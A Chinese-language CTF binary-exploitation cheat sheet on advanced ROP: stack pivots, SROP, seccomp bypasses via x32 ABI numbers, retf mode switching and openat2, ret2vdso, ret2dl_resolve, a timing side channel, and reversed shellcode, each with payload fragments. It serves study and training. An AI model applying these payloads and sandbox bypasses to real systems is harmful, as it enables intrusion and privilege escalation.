---

phase: binary
vuln_class: [pwn, rop, srop, seccomp, ret2dlresolve, stack-pivot, fini-array]
title: ROP 进阶
summary: 基础 ROP 打不动时的六条出路——换栈、换架构、换 syscall 号、换解析器、换执行时机、换 payload 表示。判据是「被哪一层挡住」。
---

# ROP 进阶

基础链、ret2csu、坏字符、`xchg` 枢轴见 [[binary/漏洞利用/rop-and-shellcode.md|ROP 与 shellcode]]；原语查表见 [[binary/漏洞利用/field-notes.md|原语速查表]]；seccomp 的通用打法见 [[binary/漏洞利用/advanced.md|语义误用与 seccomp]]。

## 0. 判据速查

| 被什么挡住 | 解法 | 去哪节 |
|---|---|---|
| 溢出只有 20 来字节，装不下链 | 两次 `leave;ret` 换到 BSS，再用 `fgets` 灌长链 | §1 |
| payload 必须整体是合法 UTF-8 | SROP 只用 3 个 gadget，帧内跨字段拼 UTF-8 | §2 |
| 溢出太小且静态链接、无 PLT/GOT | `_fini_array` 双入口当可重入回调表 | §3 |
| 静态链接但有 `system` 和 `/bin/sh` | 12 字节 `system;exit;&binsh` 就够 | §4 |
| 二进制里一个有用 gadget 都没有 | 打 vDSO（`AT_SYSINFO_EHDR` 定位） | §5 |
| 要绕 PIE 但没有 leak | vsyscall 固定地址当 `ret` 滑板 | §6 |
| seccomp 精确匹配 `execve` | x32 ABI 号 `0x4000003B` | §7 |
| seccomp 按 `AUDIT_ARCH_X86_64` 配的 | `retf` 切 32 位，走 `int 0x80` | §8 |
| seccomp 挡了 `open`/`openat` | `openat2`(437)、`sendfile`(40)、`readv`/`writev` | §9 |
| seccomp 挡了所有写 syscall | 计时侧信道逐字节试 | §10 |
| 不知道 libc 版本但要 `syscall` | 从泄露的 `read()` 函数体里扫 `0f 05` | §11 |
| 完全没 libc leak，Partial RELRO | 伪造 `Rela`/`Sym`/dynstr 让链接器自己解析 | §12 |
| 栈上每个字必须满足某个数论性质 | 拆成两份合法值的和 + 一个合并 gadget | §13 |
| 唯一的枢轴 gadget 夹着垃圾指令 | 逐行看有没有踩 `esp`，没有就照用 | §14 |
| 输入会被反转 | 反着写 shellcode，用 `jmp *%rsp` 落地 | §15 |

## 1. 两次 `leave;ret` 换栈

溢出只够盖 `rbp` + `rip`，装不下链，也没有 libc leak。

```python
payload  = b'A' * 128
payload += p64(BSS_STAGE)     # 盖掉 rbp → 指向 BSS
payload += p64(LEAVE_RET)     # leave: rsp=rbp=BSS；ret: 跳到 BSS 上第一条
```

`leave; ret` 等价于 `mov rsp, rbp; pop rbp; ret`——**控 `rbp` 就等于控换栈目标**。第一次换到 BSS 后，那里预置一段迷你 ROP 调 `fgets`，把真正的长链读进来：

```python
stage2 = flat(SET_RDX_STDIN,
              POP_RDI, BSS_STAGE + 0x100,
              POP_RSI_R15, 0x700, 0,
              elf.plt['fgets'],
              BSS_STAGE + 0x100)     # 直接返回到刚读进来的链
```

**两次而非一次**：第一次只完成「换栈」，第二次（`fgets` 后的 `ret`）才落到真正载荷。判据是「溢出窗口 < 一条完整链长度」且 BSS 可写且地址已知（无 PIE 或已泄）。

## 2. UTF-8 约束下的 SROP

Rust 的 `from_utf8_lossy()` 会把非法 UTF-8 换成替换字符，等于把 payload 改掉。而**普通 ROP 的 gadget 地址高位是 `0x00 0x40 0x7f` 之类，单字节就不合法**。

SROP 只用 3 个 gadget（`pop rax`、`syscall`、返回地址），然后把「所有寄存器」交给 15 号 `sigreturn` 的信号帧，帧里全是 8 字节字段。

**关键技巧：多字节 UTF-8 可以跨字段**。信号帧字段紧邻排布，一个 3 字节序列可以从 `r15` 的最后一字节开始、在 `rdi` 的前两字节结束：

```python
# rdi 想指向 0x2f9fb0 → 字节 [B0, 9F, 2F, ...]
# B0/9F 是 10xxxxxx 续字节，不能做序列首字节
# 把 r15 的末字节设成 0xE0（3 字节首字节）
# E0 B0 9F = U+0C1F，跨 r15→rdi 边界构成合法序列
frame.r15 = 0xE000000000000000
frame.rdi = buf_addr + 0x178
```

判据：payload 要过 `String`/`from_utf8`/JSON 解析。**SROP 的价值是「把 gadget 数量压到 3 个」**，不是「省字节」。

## 3. `_fini_array` 双入口

静态链接、没有 PLT/GOT 可劫持，但 `_fini_array` 里的指针在 `exit()` 时会被调用。两个槽都写成同一个「能再写一段字节」的 gadget：

```text
_fini_array[0] = do_overwrite   # 第一轮：写下一段
_fini_array[1] = do_overwrite   # 第二轮：写最后一段并触发
```

配 `add rsp, N; ret` 往下走栈，每轮把新内容接在上一帧后面。**效果是一个可重入回调表**——不需要重启进程就能无限加深 ROP。

注意 `.fini_array` 在 Full RELRO 下也常可写（它不在 GOT 段），比劫持 GOT 的适用范围更广。

## 4. 静态链接的 12 字节 ret2libc

`checksec` 显示 No PIE + `file` 说 statically linked，则 `system`、`exit` 和 `"/bin/sh"` 全在二进制内固定偏移——**libc 的整个字符串表也被静态链接拖进来了**。

```python
payload  = cyclic(17)      # 溢出到 saved EIP 只有 17 字节
payload += p32(system)     # 0x0804ee30
payload += p32(exit_a)     # 0x0804e330，避免 shell 退出后 SIGSEGV
payload += p32(binsh)      # 0x080bc140
```

```bash
strings -a binary | grep -n /bin/sh
nm binary | grep ' T system'
```

**溢出窗口再小也能塞下 12 字节**，这是「窗口太小」类题的第一优先检查项。

## 5. ret2vdso

静态链接、函数极少、`ROPgadget` 一个可用 gadget 都搜不出。但内核给每个进程映射了 vDSO，里面有足够 `execve` 的 gadget。

五步：泄栈 → 用二进制自己的 `read` 把 `/bin/sh` 写到页对齐的已知地址 → dump 栈找 `AT_SYSINFO_EHDR`（auxv 类型 `0x21`）拿 vDSO 基址 → dump vDSO 找 gadget → 拼链。

```python
for i in range(0, len(stackdump) - 15, 8):
    if u64(stackdump[i:i+8]) == 0x21:
        cand = u64(stackdump[i+8:i+16])
        if 0x7f0000000000 <= cand <= 0x7fffffffffff and cand & 0xFFF == 0:
            vdso_base = cand; break
```

```python
POP_RDX_RAX_RET     = vdso_base + 0xba0   # pop rdx; pop rax; ret
POP_RBX_R12_RBP_RET = vdso_base + 0x8c6
MOV_RDI_RBX_SYSCALL = vdso_base + 0x8e3   # mov rdi,rbx; mov rsi,r12; syscall
```

**vDSO 的 gadget 偏移随内核版本变**，必须 dump 远程的那份，别用本地偏移。QEMU 托管的自定义内核尤其明显。

## 6. vsyscall 当固定地址滑板

老内核把 vsyscall 页映射在 `0xffffffffff600000`，**与 ASLR/PIE 无关**，且每个入口末尾都有 `ret`：

- `0xffffffffff600000` gettimeofday
- `0xffffffffff600400` time
- `0xffffffffff600800` getcpu

```python
payload  = b'A' * 72
payload += p64(0xffffffffff600400)   # 当 NOP-ret
payload += p64(0xffffffffff600400)
payload += b"\x8b\x10"               # 2 字节部分覆盖返回到目标
```

`cat /proc/self/maps | grep vsyscall` 先确认存在；新内核可能 `vsyscall=none` 直接没有。

## 7. x32 ABI syscall 号混叠

x32 ABI 把 `0x40000000` 或进 syscall 号。多数 BPF 只比对低 32 位的精确值，`59` 被拦而 `0x4000003B` 漏过，内核仍派发到同一个 `execve` handler。

```python
rop = flat(pop_rax, 0x4000003B,
           pop_rdi, binsh, pop_rsi, 0, pop_rdx, 0, syscall_ret)
```

判据：`seccomp-tools dump` 看它有没有校验 `AUDIT_ARCH`、有没有先把 x32 位掩掉。现代策略用 `SECCOMP_RET_KILL_PROCESS` + 显式校验 `AUDIT_ARCH_X86_64` 就堵死了。

## 8. `retf` 切 32 位

seccomp 按 `AUDIT_ARCH_X86_64` 配的，只管 64 位 syscall。`retf`（远返回）从栈上弹 `RIP` 再弹 `CS`，`CS = 0x23` 就把 CPU 切到 IA-32e 兼容模式，此时 `int 0x80` 用另一套号（`open=5`、`read=3`、`write=4`、`exit=1`）。

```python
# 先 mprotect BSS 成 RWX（32 位 shellcode 要在可执行页上跑）
rop  = flat(POP_RDI, 0x404000, POP_RSI_R15, 0x1000, 0,
            POP_RDX_RBX, 7, 0, libc_base + libc.sym.mprotect)
rop += flat(RETF)
rop += p32(0x404a80)     # 32 位 EIP
rop += p32(0x23)         # CS
```

```bash
ROPgadget --binary libc.so.6 | grep retf
objdump -d libc.so.6 | grep -w retf    # 也可以直接找 0xcb
```

**必须 `mprotect`**：32 位 shellcode 跑在 BSS 上，那页默认不可执行。

## 9. seccomp 下换 syscall

```bash
seccomp-tools dump ./binary
```

被挡 `open`/`read` 时的替代：`openat`(257)、**`openat2`(437，最常被漏)**、`sendfile`(40)、`readv`/`writev`。

`openat2` 特别值得试——很多策略只列了 `open`/`openat`，`openat2` 是 5.6 之后才有的新号。

## 10. 计时侧信道

seccomp 挡了所有写 syscall（`write`/`sendto`/`writev`）时，用「匹配就烧 CPU」把字节泄露出去：

```nasm
mov al, [rsi + N]        ; 取 flag 第 N 字节
cmp al, 0x41             ; 猜 'A'
jne done
xor ecx, ecx
.loop: inc ecx
cmp ecx, 0xffffffff      ; 命中就空转约 4 秒
jne .loop
done: xor edi, edi
mov eax, 60
syscall
```

客户端测 `elapsed > 3.0` 判命中。**每次连接只试一个字节**，最坏 `95 × 长度` 次连接，可打印字符集能压到这个量级。

判据：允许 `open`/`read` 但所有写族被禁；或程序本身没有任何输出路径。

## 11. JIT-ROP：从 `read()` 函数体里扫 `syscall`

不知道 libc 版本，但能泄露 GOT、能任意读。`read()` 内部必然有一条 `syscall`：

```text
read() 是 syscall 的薄封装：
  mov eax, 0
  syscall          ← 要找的 0f 05
  cmp rax, -4096
```

```python
read_addr = leak_got(elf.got['read'])
buf = read_memory(read_addr, 0x100)
syscall_addr = read_addr + buf.index(b'\x0f\x05')
write_got(elf.got['srand'], syscall_addr)     # 塞进没人用的 GOT 槽
```

然后 `rax` 用 `read()` 的返回值控制：**正好发 59 字节**，`read` 返回 59 = `__NR_execve`。

判据：Partial RELRO（GOT 可写）、无 libc 版本、有任意读。任何内部执行 syscall 的函数（`read`/`write`/`open`/`mmap`）都有 `0f 05`，`read` 优先因为返回值天然可控 `rax`。

## 12. ret2dl_resolve（64 位）

完全拿不到 libc 基址，但 Partial RELRO，且能往 BSS 写任意内容——让动态链接器自己去解析 `system`。

解析链路：

```text
PLT stub → _dl_runtime_resolve(link_map, reloc_index)
  1. 取 .rela.plt[reloc_index] 的 Elf64_Rela
  2. 从 r_info 高位取符号索引
  3. 取 .dynsym[idx] 的 Elf64_Sym
  4. 用 st_name 在 .dynstr 里取符号名
  5. 在各已加载库里搜这个名字
  6. [64 位专属] 查 .gnu.version[idx] 校验版本  ← 必须绕
  7. 写进 GOT 并跳过去
```

伪造三个结构（每个 24 字节，注意索引是按「偏移 / 24」算的）：

```python
sym_index   = (fake_sym_addr  - SYMTAB) // 24
reloc_index = (fake_rela_addr - JMPREL) // 24

fake_sym  = flat(p32(fake_str_addr - STRTAB),  # st_name → "system"
                 p8(0x12),                      # STT_FUNC | STB_GLOBAL<<4
                 p8(0), p16(0),                 # st_other, st_shndx=UNDEF
                 p64(0), p64(0))                # st_value, st_size
fake_rela = flat(p64(BSS + 0x400),              # r_offset → 可写 GOT 槽
                 p64((sym_index << 32) | 7),    # R_X86_64_JUMP_SLOT
                 p64(0))
fake_str  = b"system\x00"
```

**64 位的难点全在 VERSYM**。把 `link_map->l_info[DT_VERSYM]` 置 NULL 就跳过版本校验：

```python
link_map = read_got(1)                    # GOT[1] 就是 link_map 指针
write_memory(link_map + 0x1c8, p64(0))    # 偏移随 glibc 版本变，需确认
```

最后 `pop rdi` 设好参数 → 跳 `PLT[0]`（通用解析桩）→ 紧跟一个 `p64(reloc_index)`。

判据：无 libc leak、Partial RELRO、gadget 够写 BSS。**远程 libc 完全未知时，这比盲猜版本靠谱。**

## 13. 数论约束下的 ROP

栈上每个字必须满足某个数论性质（如必须素数）时，直接写 gadget 地址必然失败。

**通法：把目标值写成若干「合法值」的和，再加一个极小的合并 gadget 在 `ret` 前还原。**

Goldbach 保证任意偶数 > 2 可拆成两素数之和：

```python
from sympy import isprime, nextprime

def prime_split(addr):
    if addr % 2 and isprime(addr - 2):
        return (2, addr - 2)
    p1 = 3
    while not (isprime(p1) and isprime(addr - p1)):
        p1 = nextprime(p1)
    return (p1, addr - p1)
```

每三个栈槽放 `(p1, p2, 合并 gadget)`。合并 gadget 形如 `pop rax; pop rdx; add rax, rdx; push rax; ret`，或任何能「把相邻两槽合成一槽再 ret」的序列。

同类约束换定理：要求完全平方 → 拉格朗日四平方和；要求非零 → 拆成两非零之和。

## 14. 带垃圾指令的枢轴 gadget

唯一的枢轴 gadget 中间夹着一堆无关指令：

```asm
0x80c0620: pop ebp ; add al,0x89 ; pop esp ; and al,0x30 ; add esp,0x24 ; ret
```

**别急着放弃**。逐行看：`add al`/`and al` 只动 `al`，不碰 `esp`；末尾 `add esp, 0x24` 只是跳过 9 个槽——前面填 9 个垃圾 dword 就行。

判据：**只要没有指令写 `esp`，这个 gadget 就能枢轴**，其余副作用都可以用 padding 吸收。

## 15. 输入会被反转时写 shellcode

程序把输入 buffer 反转后才返回。做法：**反着写 shellcode**，再用 `sub rsp,0x10; jmp *%rsp` 落地。

```python
# 1. 泄地址破 PIE
# 2. 找 sub rsp, 0x10; jmp *%rsp
# 3. shellcode 与 rip 覆盖字节都预先反转
# 4. 6 字节部分覆盖 RIP（高 2 字节同映射，且避开 0x00）
# 5. 落地后先 jmp short 跳进 NOP sled 再进 shellcode
```

`scanf("%s")` 不能含 `\x00`，所以必须走部分覆盖 + 短跳 + NOP sled，不能用多地址链。

## 16. 命令速查

```bash
one_gadget libc.so.6           # 一发入魂 gadget
ropper -f binary               # gadget 搜索
ROPgadget --binary binary      # 另一种搜索
seccomp-tools dump ./binary    # 看 seccomp 规则
```

## 17. 纪律

- **先 `seccomp-tools dump`**。挡住你的是 seccomp 还是 gadget 缺失，决定了完全不同的路线，别猜。
- **溢出窗口小先查静态链接**。静态链接的 12 字节 `system;exit;&binsh` 是最省事的解，先排除它再谈枢轴。
- **没有 gadget 不等于打不动**：vDSO、vsyscall、`read()` 函数体、`_fini_array` 都是 gadget 的替代来源。
- **约束型题（UTF-8 / 素数 / 反转）先找「表示层」绕过**，别去改语义——SROP 减 gadget、Goldbach 拆值、反写 shellcode 都是表示层手法。
- **`ret2dl_resolve` 的 VERSYM 偏移随 glibc 变**，用之前先在目标 libc 上确认 `l_info[DT_VERSYM]` 的实际偏移。
